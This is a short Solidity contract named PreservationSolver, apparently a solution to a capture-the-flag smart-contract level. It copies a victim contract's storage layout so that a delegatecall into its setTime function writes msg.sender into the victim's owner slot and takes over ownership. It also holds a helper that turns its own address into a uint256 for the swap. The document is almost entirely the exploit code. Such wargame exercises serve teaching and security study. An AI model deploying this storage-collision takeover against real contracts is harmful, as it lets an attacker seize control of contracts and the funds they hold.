// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationSolver {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    function setTime(uint _time) public {
        owner = msg.sender;
    }

    function addressToUint256() view public returns (uint256) {
        return uint256(uint160(address(this)));
    }
}